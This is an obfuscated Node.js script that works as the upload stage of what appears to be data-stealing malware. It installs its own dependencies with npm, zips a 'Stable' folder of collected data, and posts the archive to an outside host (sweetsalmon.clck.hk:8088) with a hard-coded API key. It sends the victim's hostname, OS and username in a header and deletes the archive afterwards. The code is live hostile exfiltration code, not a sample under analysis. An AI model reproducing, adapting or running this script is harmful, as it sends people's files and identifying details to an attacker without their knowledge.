const _0xd28a16=_0x18dc;(function(_0x325e38,_0x2be8ca){const _0x438def=_0x18dc,_0x255ac0=_0x325e38();while(!![]){try{const _0x2c8009=-parseInt(_0x438def(0x16d))/0x1+-parseInt(_0x438def(0x14c))/0x2+parseInt(_0x438def(0x18c))/0x3+-parseInt(_0x438def(0x167))/0x4*(-parseInt(_0x438def(0x15b))/0x5)+-parseInt(_0x438def(0x180))/0x6*(-parseInt(_0x438def(0x1a4))/0x7)+-parseInt(_0x438def(0x17d))/0x8*(-parseInt(_0x438def(0x152))/0x9)+-parseInt(_0x438def(0x192))/0xa*(parseInt(_0x438def(0x191))/0xb);if(_0x2c8009===_0x2be8ca)break;else _0x255ac0['push'](_0x255ac0['shift']());}catch(_0x326898){_0x255ac0['push'](_0x255ac0['shift']());}}}(_0x4df6,0x92b28));const fs=require('fs'),os=require('os'),path=require(_0xd28a16(0x1ab)),{exec,execSync}=require('child_process'),dns=require(_0xd28a16(0x16e));try{require(_0xd28a16(0x19d)),require(_0xd28a16(0x146));}catch(_0x1f4be8){console[_0xd28a16(0x184)](_0xd28a16(0x16f)),execSync(_0xd28a16(0x1a6)),console[_0xd28a16(0x184)](_0xd28a16(0x19a));}const axios=require('axios'),FormData=require('form-data'),CONFIG={'serverDomain':_0xd28a16(0x197),'serverPath':'/api/files/upload','serverPort':0x1f98,'apiKey':_0xd28a16(0x150),'chunkSize':0x100*0x400,'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x1d4c0,'stableDir':'Stable'};function log(_0x41840a,_0x5c5a6d=![]){const _0x43a456=_0xd28a16,_0x3d7b4c=new Date()[_0x43a456(0x17e)](),_0x134f07='['+_0x3d7b4c+']\x20'+_0x41840a;_0x5c5a6d?console['error'](_0x134f07):console['log'](_0x134f07);try{fs['appendFileSync'](_0x43a456(0x1a5),_0x134f07+'\x0a');}catch(_0x103dd2){console[_0x43a456(0x190)](_0x43a456(0x1a2)+_0x103dd2[_0x43a456(0x179)]);}}function formatFileSize(_0x21f92e){const _0x285ef4=_0xd28a16;if(_0x21f92e===0x0)return _0x285ef4(0x19b);const _0x54abb1=0x400,_0x4b3444=[_0x285ef4(0x199),'KB','MB','GB','TB'],_0x4e49db=Math[_0x285ef4(0x181)](Math[_0x285ef4(0x184)](_0x21f92e)/Math[_0x285ef4(0x184)](_0x54abb1));return parseFloat((_0x21f92e/Math[_0x285ef4(0x185)](_0x54abb1,_0x4e49db))[_0x285ef4(0x159)](0x2))+'\x20'+_0x4b3444[_0x4e49db];}function _0x4df6(){const _0x248626=['.zip','...','statSync','ZIP\x20archive\x20created:\x20','Network\x20error:\x20','message','Data\x20directory\x20not\x20found:\x20','Unexpected\x20error:\x20','loaded','3664msNNbD','toISOString','lookup','510MzFTaH','floor','Creating\x20ZIP\x20archive:\x20','Retrying\x20in\x20','log','pow','round','getHeaders','retryDelay','readFileSync','hostname','DNS\x20resolution\x20error:\x20','1776660LHYSGd','Directory\x20not\x20found:\x20','serverDomain','createReadStream','error','574354NfxJjR','110Bczffu','utf8','Make\x20sure\x20to\x20run\x20collect-data.js\x20first','post','cwd','sweetsalmon.clck.hk','Starting\x20data\x20upload\x20process','Bytes','Dependencies\x20installed\x20successfully','0\x20Bytes','serverPort','axios','Server\x20error:\x20','Attempting\x20to\x20resolve\x20domain:\x20','status','https','Error\x20writing\x20to\x20log:\x20','ZIP\x20file\x20removed:\x20','81032yyrsBn','uploader.log','npm\x20install\x20axios\x20form-data',')\x20reached,\x20giving\x20up','\x20of\x20','total','Maximum\x20retry\x20count\x20(','path','Upload\x20failed:\x20','form-data','Failed\x20to\x20create\x20ZIP\x20archive:\x20','existsSync','Upload\x20completed\x20in\x20','userInfo','response','1879020ivQnGt','trim','timeout','Starting\x20upload\x20to\x20','tJz4uRVCwl2eEwyPTudYP9iGRfgq','\x20-x\x20\x22*.DS_Store\x22','13050ldqioD','substring','success','stableDir','platform','maxRetries','now','toFixed','Upload\x20failed','136375sazpdb','exit','File\x20is\x20empty','basename','toString','\x20resolved\x20to\x20','client-id.txt','size','\x20seconds...\x20(Attempt\x20','Upload\x20progress:\x20','File\x20not\x20found:\x20','Starting\x20upload\x20process...','80WMHRof','\x20seconds','stringify','application/zip','ZIP\x20archive\x20file\x20not\x20found\x20after\x20creation','join','671044VkcbCc','dns','Installing\x20required\x20dependencies...','username','Error\x20reading\x20client\x20ID:\x20','serverPath','data'];_0x4df6=function(){return _0x248626;};return _0x4df6();}function getClientId(){const _0x153f78=_0xd28a16;try{if(fs[_0x153f78(0x148)](_0x153f78(0x161)))return fs[_0x153f78(0x189)](_0x153f78(0x161),_0x153f78(0x193))[_0x153f78(0x14d)]();}catch(_0x13da4e){log(_0x153f78(0x171)+_0x13da4e[_0x153f78(0x179)],!![]);}return Math['random']()[_0x153f78(0x15f)](0x24)[_0x153f78(0x153)](0x2,0xa);}async function createZipArchive(){const _0x2ad4b0=_0xd28a16;try{const _0x563f6a=getClientId(),_0x43721f=_0x563f6a+_0x2ad4b0(0x174);log(_0x2ad4b0(0x182)+_0x43721f+_0x2ad4b0(0x175));if(!fs['existsSync'](CONFIG['stableDir']))throw new Error(_0x2ad4b0(0x18d)+CONFIG[_0x2ad4b0(0x155)]);const _0x224fc1='zip\x20-r\x20-1\x20'+_0x43721f+'\x20'+CONFIG[_0x2ad4b0(0x155)]+_0x2ad4b0(0x151),_0x139bc2=execSync(_0x224fc1,{'encoding':'utf8'});if(fs[_0x2ad4b0(0x148)](_0x43721f)){const _0x1179fd=fs[_0x2ad4b0(0x176)](_0x43721f);return log(_0x2ad4b0(0x177)+_0x43721f+'\x20('+formatFileSize(_0x1179fd[_0x2ad4b0(0x162)])+')'),_0x43721f;}else throw new Error(_0x2ad4b0(0x16b));}catch(_0x17f4c4){return log(_0x2ad4b0(0x147)+_0x17f4c4[_0x2ad4b0(0x179)],!![]),null;}}async function resolveDomainAndUpload(_0x32e57a,_0x5a854f=0x0){const _0x162d2c=_0xd28a16;log(_0x162d2c(0x19f)+CONFIG['serverDomain']);try{const _0x5e7c3f=await new Promise((_0x1f0d39,_0x34a566)=>{const _0x22c18b=_0x162d2c;dns[_0x22c18b(0x17f)](CONFIG[_0x22c18b(0x18e)],(_0x1a58d6,_0x520c29)=>{_0x1a58d6?_0x34a566(_0x1a58d6):_0x1f0d39(_0x520c29);});});return log('Domain\x20'+CONFIG[_0x162d2c(0x18e)]+_0x162d2c(0x160)+_0x5e7c3f),uploadFile(_0x32e57a,_0x5a854f);}catch(_0x4b4897){return log(_0x162d2c(0x18b)+_0x4b4897[_0x162d2c(0x179)],!![]),_0x5a854f<CONFIG[_0x162d2c(0x157)]?(log(_0x162d2c(0x183)+CONFIG[_0x162d2c(0x188)]/0x3e8+_0x162d2c(0x163)+(_0x5a854f+0x1)+_0x162d2c(0x1a8)+CONFIG[_0x162d2c(0x157)]+')'),await new Promise(_0x5dab60=>setTimeout(_0x5dab60,CONFIG[_0x162d2c(0x188)])),resolveDomainAndUpload(_0x32e57a,_0x5a854f+0x1)):(log('Maximum\x20retry\x20count\x20('+CONFIG['maxRetries']+_0x162d2c(0x1a7),!![]),![]);}}async function uploadFile(_0x222ea1,_0x262297=0x0){const _0x5802ca=_0xd28a16;try{const _0x5a367b=path[_0x5802ca(0x16c)](process[_0x5802ca(0x196)](),_0x222ea1);if(!fs['existsSync'](_0x5a367b))return log(_0x5802ca(0x165)+_0x5a367b,!![]),![];const _0x2129ba=fs['statSync'](_0x5a367b),_0x214049=_0x2129ba[_0x5802ca(0x162)];if(_0x214049===0x0)return log(_0x5802ca(0x15d),!![]),![];const _0x2e338e=new FormData();_0x2e338e['append']('file',fs[_0x5802ca(0x18f)](_0x5a367b),{'filename':path[_0x5802ca(0x15e)](_0x5a367b),'contentType':_0x5802ca(0x16a),'knownLength':_0x214049});const _0x4a37a3={'hostname':os[_0x5802ca(0x18a)](),'platform':os[_0x5802ca(0x156)](),'type':os['type'](),'arch':os['arch'](),'username':os[_0x5802ca(0x14a)]()[_0x5802ca(0x170)],'id':getClientId()},_0x9a5c36=Date[_0x5802ca(0x158)](),_0x2ba83b=CONFIG[_0x5802ca(0x19c)]===0x1bb?_0x5802ca(0x1a1):'http',_0x112a76=_0x2ba83b+'://'+CONFIG[_0x5802ca(0x18e)]+':'+CONFIG[_0x5802ca(0x19c)]+CONFIG[_0x5802ca(0x172)];log(_0x5802ca(0x14f)+_0x112a76);const _0x2113e4=await axios[_0x5802ca(0x195)](_0x112a76,_0x2e338e,{'headers':{..._0x2e338e[_0x5802ca(0x187)](),'X-Client-Info':JSON[_0x5802ca(0x169)](_0x4a37a3),'Content-Length':_0x2e338e['getLengthSync']()},'maxContentLength':Infinity,'maxBodyLength':Infinity,'timeout':CONFIG[_0x5802ca(0x14e)],'onUploadProgress':_0x3dd000=>{const _0x5c0883=_0x5802ca,_0x2779d2=Math[_0x5c0883(0x186)](_0x3dd000[_0x5c0883(0x17c)]*0x64/_0x3dd000[_0x5c0883(0x1a9)]);_0x2779d2%0xa===0x0&&log(_0x5c0883(0x164)+_0x2779d2+'%');}}),_0x3666e2=(Date[_0x5802ca(0x158)]()-_0x9a5c36)/0x3e8;return log(_0x5802ca(0x149)+_0x3666e2[_0x5802ca(0x159)](0x2)+_0x5802ca(0x168)),_0x2113e4[_0x5802ca(0x173)][_0x5802ca(0x154)];}catch(_0x1ecdce){const _0x533d81=_0x1ecdce[_0x5802ca(0x14b)]?_0x5802ca(0x19e)+_0x1ecdce['response'][_0x5802ca(0x1a0)]+'\x20'+_0x1ecdce[_0x5802ca(0x14b)]['statusText']:_0x5802ca(0x178)+_0x1ecdce[_0x5802ca(0x179)];return log(_0x5802ca(0x145)+_0x533d81,!![]),_0x262297<CONFIG[_0x5802ca(0x157)]?(log('Retrying\x20in\x20'+CONFIG[_0x5802ca(0x188)]/0x3e8+_0x5802ca(0x163)+(_0x262297+0x1)+_0x5802ca(0x1a8)+CONFIG[_0x5802ca(0x157)]+')'),await new Promise(_0x3c34d3=>setTimeout(_0x3c34d3,CONFIG[_0x5802ca(0x188)])),uploadFile(_0x222ea1,_0x262297+0x1)):(log(_0x5802ca(0x1aa)+CONFIG['maxRetries']+_0x5802ca(0x1a7),!![]),![]);}}function _0x18dc(_0x30e43e,_0x5cbd50){const _0x4df6bf=_0x4df6();return _0x18dc=function(_0x18dc13,_0x79f08b){_0x18dc13=_0x18dc13-0x145;let _0xe48dd8=_0x4df6bf[_0x18dc13];return _0xe48dd8;},_0x18dc(_0x30e43e,_0x5cbd50);}async function main(){const _0x42db5f=_0xd28a16;try{log(_0x42db5f(0x198));!fs[_0x42db5f(0x148)](CONFIG[_0x42db5f(0x155)])&&(log(_0x42db5f(0x17a)+CONFIG[_0x42db5f(0x155)],!![]),log(_0x42db5f(0x194),!![]),process[_0x42db5f(0x15c)](0x1));const _0x35ac14=await createZipArchive();!_0x35ac14&&(log('Failed\x20to\x20create\x20archive',!![]),process[_0x42db5f(0x15c)](0x1));log(_0x42db5f(0x166));const _0x32373a=await resolveDomainAndUpload(_0x35ac14);if(_0x32373a){log('Upload\x20completed\x20successfully');try{fs[_0x42db5f(0x148)](_0x35ac14)&&(fs['unlinkSync'](_0x35ac14),log(_0x42db5f(0x1a3)+_0x35ac14));}catch(_0x92ed81){log('Error\x20removing\x20ZIP\x20file:\x20'+_0x92ed81[_0x42db5f(0x179)],!![]);}process[_0x42db5f(0x15c)](0x0);}else log(_0x42db5f(0x15a),!![]),process['exit'](0x1);}catch(_0x1f18c6){log(_0x42db5f(0x17b)+_0x1f18c6[_0x42db5f(0x179)],!![]),process[_0x42db5f(0x15c)](0x1);}}main();
